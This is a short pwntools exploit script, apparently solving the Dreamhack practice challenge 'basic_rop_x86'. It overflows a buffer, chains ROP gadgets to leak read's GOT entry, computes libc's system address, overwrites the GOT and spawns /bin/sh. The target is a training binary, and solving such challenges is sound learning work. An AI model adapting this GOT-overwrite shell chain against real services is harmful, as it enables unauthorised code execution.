from pwn import *

p = process('./basic_rop_x86')
#p = remote('host3.dreamhack.games', 15238)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6', checksec = False)
#gdb.attach(p, api=True)

read_got = e.got['read']
read_plt = e.plt['read']
write_plt = e.plt['write']
pop_esi_edi_ebp = 0x08048689
pop_edi_ebp = 0x0804868a
pop_ebp = 0x0804868b
write_area = 0x804a050

payload = b'A'*72
payload += p32(read_plt) + p32(pop_esi_edi_ebp) + p32(0) + p32(write_area) + p32(len(str("/bin/sh\x00")))     #read(1, write_area, len(binsh))
payload += p32(write_plt) + p32(pop_esi_edi_ebp) + p32(1) +p32(read_got) + p32(4)                             #write(1, read_got, 4)
payload += p32(read_plt) + p32(pop_esi_edi_ebp) + p32(0) + p32(read_got) + p32(4)                             #read(0, read_got, 4)
payload += p32(read_plt) + p32(0xaaaabbbb) + p32(write_area)                                                  #system(/bin/sh)

p.send(payload)
p.recvuntil(b"A"*0x40)
p.send(b'/bin/sh\x00')
read = u32(p.recv(4,timeout=1))
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']

log.info("read offset" + hex(libc.symbols['read']))
log.info("system offset " + hex(libc.symbols['system']))
log.info("read " + hex(read))
log.info("system " + hex(system))

p.send(p32(system))
p.interactive()